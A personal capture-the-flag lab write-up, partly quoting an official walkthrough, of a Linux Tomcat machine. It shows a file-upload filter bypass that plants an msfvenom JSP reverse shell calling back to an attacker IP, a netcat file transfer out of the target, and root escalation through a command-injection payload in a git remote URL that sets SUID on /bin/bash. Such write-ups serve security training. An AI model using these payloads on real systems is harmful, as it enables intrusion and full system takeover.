---
Status: pause
OS: Linux
Difficulty: Hard
tags:
  - Tomcat
  - file_upload
  - ReverseEngineer
  - cron
Date: 2026-11-09T23:33:00
Owned: 2026-11-10T01:58:00
---

---
# Enumeration
## port scan
rust scan  
![[Pasted image 20261109233220.png]]

## port 8080

upload gui  
![[Pasted image 20261109233344.png]]

once upload the file get uploaded to /uploads  
![[Pasted image 20261109233803.png]]

clicking on the `here` send get request and download the file we uploaded  
I need to get the server to execute the command or file somehow

# Dir Enum

feroxbuster  
```sh
feroxbuster -u http://192.168.144.241:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ferox.txt
```
![[Pasted image 20261109234222.png]]

/docs show the server is running apache tomcat version 9.0.58  
![[Pasted image 20261109234032.png]]

# Foothold  

From Dir enum we have the source code from backup.zip  

While analyzing the source, we find the following snippet `src/main/java/com/ugc/app/controller/HomeController.java`:

```java
package com.ugc.app.controller;

import org.springframework.http.MediaType;
import org.springframework.stereotype.Controller;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

<p><br/></p>

@Controller
@RequestMapping("/")
public class HomeController {

    @GetMapping("")
    public String index() {
        return "index";
    }

<p><br/></p>

    @RequestMapping(value = "/upload", method = {RequestMethod.POST}, produces = {MediaType.MULTIPART_FORM_DATA_VALUE,
            MediaType.APPLICATION_FORM_URLENCODED_VALUE, MediaType.APPLICATION_JSON_VALUE})
    public String upload(HttpServletRequest request, @RequestParam("file") MultipartFile multiPartFile) {

<p><br/></p>

        if (!multiPartFile.isEmpty()) {

            if (isSafeUploadContent(multiPartFile)) {

                try {
                    final File file = getUploadFileLocation(multiPartFile);
                    ;

                    Files.write(file.toPath(), multiPartFile.getBytes());

                    request.setAttribute("file", file);

                } catch (IOException e) {
                    e.printStackTrace();
                }

            }

        } else {
            request.setAttribute("msg", "Invalid file extension.");
        }

        return "index";
    }

    private File getUploadFileLocation(MultipartFile multiPartFile) {
        final File uploadFolder = new File("/opt/tomcat/latest/webapps/ROOT/uploads");
        uploadFolder.mkdirs();

        // Prevent path traversal
        String safeName = StringUtils.cleanPath(multiPartFile.getOriginalFilename());
        return new File(uploadFolder, safeName).getAbsoluteFile();
    }

    private boolean isSafeUploadContent(MultipartFile multiPartFile) {
        if (multiPartFile.getOriginalFilename().endsWith(".jsp")) {
            return false;
        }
        if (multiPartFile.getOriginalFilename().endsWith(".html")) {
            return false;
        }
        return true;
    }

}

```

Upon further analysis we notice that `isSafeUploadContent` is supposed to prevent the user from uploading a webshell.

However, since it is only checking that the filename doesn't end with `jsp` or `html`, we can bypass this check by uploading a `jsp` webshell, and editing the filename of the file upload request to add a `/` at the end of the filename.


we can see .jsp is allowed  
generate the shell.jsp using msfvenom payload can use the revshells.com  
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.191 LPORT=4444 -f raw -o shell.jsp
```

add `/` to bypass upload  
![[Pasted image 20261110005618.png]]

access the path  
![[Pasted image 20261110005833.png]]

got the shell  
![[Pasted image 20261110005908.png]]

![[Pasted image 20261110010231.png]]

# Privilege Escalation

SUID
![[Pasted image 20261110010607.png]]

capabilities  
![[Pasted image 20261110010709.png]]

lse.sh  
![[Pasted image 20261110011523.png]]

pspy  
![[Pasted image 20261110011752.png]]

there is a process being run `/usr/local/bin/git-updater`  
let's get the file to our kali  

the target doesn't have python  

some new way to transfer file with nc  
```sh
# set up lister which let output to file
nc -lvnp 1337 > git-updater

# on target input the file then sent with nc
nc 192.168.45.191 1337 < /usr/local/bin/git-updater
```

send  
![[Pasted image 20261110012527.png]]

receive file  
![[Pasted image 20261110012402.png]]

got the file  
![[Pasted image 20261110012555.png]]

trying out Binary Ninja which claim to be more friendly compare to Ghidra and IDA  
https://binary.ninja/free/

looks neat, even have graph view  
![[Screenshot 2026-11-10 at 01.39.27.png]]

From this part I will just paste the official walkthrough.  
The entry code is depicted below:

![g1](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_147_image_4_ZYWLI3RT.png)

The snippet checks whether the first argument (pcVar3) exists (see line 20).

Otherwise the program exits, and all lines that do not start with a # (see line 24) are read and passed to `FUN_0010189`.

We proceed by opening the function `FUN_0010189` next:

![g2](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_147_image_5_RY4SDF2E.png)

We immediately notice the system function.

However `param_1` is the folder given in the config file, and as we do not have sufficent write permissions this is a dead end.

Going through all referenced functions, we notice:

![g3](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_147_image_6_ELX4DF2H.png)

This looks familiar to the log output we saw from the previous `pspy` usage.

There is a possible command injection, if we can control `param_1`.

`param_1` is the result of the following function:

![4](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_147_image_7_GT4FR6HM.png)

We see that it reads `pcVar3`, which is set to the remote of the repository, i.e. based on the contents of the `.git/` config we have discovered a command injection vulnerability.

In summary, the binary reads the config file located at `/etc/gupdater.conf`line by line. The binary expects a list of folders in this file and evaluates lines starting with # as a comment and skips them.  
If the entry is a valid folder it changes the working directory into the folder, and executes `git pull`, based on the remote url of the git repository which we can specify, leading to a command injection.

Back on the host, we check which local repositories are monitored:

```bash
$ cat /etc/gupdater.conf
# Place repositories to be monitored below
```

There arent any, but we do have write access to this file meaning we can add a repository to it with our payload.

However, we have to keep in mind that on line 25 all spaces of the remote url are removed.

We will proceed with our exploitation attempt.

To begin, we create a file titled `/tmp/e.sh`:

```bash
#! /bin/bash
chmod u+s /bin/bash
```

Next we adjust permissions.

```
chmod 777 /tmp/e.sh
```

Then we initialize the `git` repo:

```
$ cd /tmp
$ mkdir /tmp/e
$ cd e
$ git init
$ echo /tmp/e >> /etc/gupdater.conf
$ echo abc > .git/refs/heads/master
```

We need to create a dummy value for the head, otherwise the program will segfault.

Now we update the `.git/config` with our command injection payload in the remote url:

```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = localhost;/tmp/e.sh
        fetch = +refs/heads/*:refs/remotes/origin/*
```

Next we check that everything went correctly by executing the binary:

![root](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_147_image_8_2RE6HJ1N.png))

Waiting a bit, we see our payload getting executed by the running cron and gain root access using `bash -p`